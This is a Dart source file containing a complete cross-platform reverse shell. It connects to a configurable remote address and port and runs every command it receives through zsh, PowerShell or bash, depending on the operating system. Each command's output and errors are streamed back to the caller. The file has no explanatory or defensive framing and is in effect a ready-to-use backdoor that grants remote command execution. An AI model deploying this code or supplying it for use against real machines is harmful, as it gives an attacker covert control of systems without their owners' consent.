import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:args/args.dart';

Future<void> main(List<String> arguments) async {
  var parser = ArgParser();
  parser.addOption('address',
      abbr: 'a', defaultsTo: InternetAddress.loopbackIPv4.address);
  parser.addOption('port', abbr: 'p', defaultsTo: '4567');

  var parsedArgs = parser.parse(arguments);
  var hostAddress = parsedArgs['address'];
  var hostPort = int.tryParse(parsedArgs['port']);

  await Socket.connect(hostAddress, hostPort).then((Socket socket) {
    socket.listen(
      (Uint8List data) {
        if (Platform.isMacOS) {
          Process.start('/bin/zsh', []).then((Process process) {
            process.stdin.writeln(String.fromCharCodes(data).trim());
            process.stdout
                .transform(utf8.decoder)
                .listen((output) => socket.write(output));
            process.stderr
                .transform(utf8.decoder)
                .listen((error) => socket.write(error));
          });
        } else if (Platform.isWindows) {
          Process.start('powershell.exe', []).then((Process process) {
            process.stdin.writeln(String.fromCharCodes(data).trim());
            process.stdout
                .transform(utf8.decoder)
                .listen((output) => socket.write(output));
            process.stderr
                .transform(utf8.decoder)
                .listen((error) => socket.write(error));
          });
        } else if (Platform.isLinux) {
          Process.start('/bin/bash', []).then((Process process) {
            process.stdin.writeln(String.fromCharCodes(data).trim());
            process.stdout
                .transform(utf8.decoder)
                .listen((output) => socket.write(output));
            process.stderr
                .transform(utf8.decoder)
                .listen((error) => socket.write(error));
          });
        }
      },
      onDone: () => socket.destroy(),
      onError: (error) {
        socket.write('Error $error');
        socket.destroy();
      },
    );
  });
}
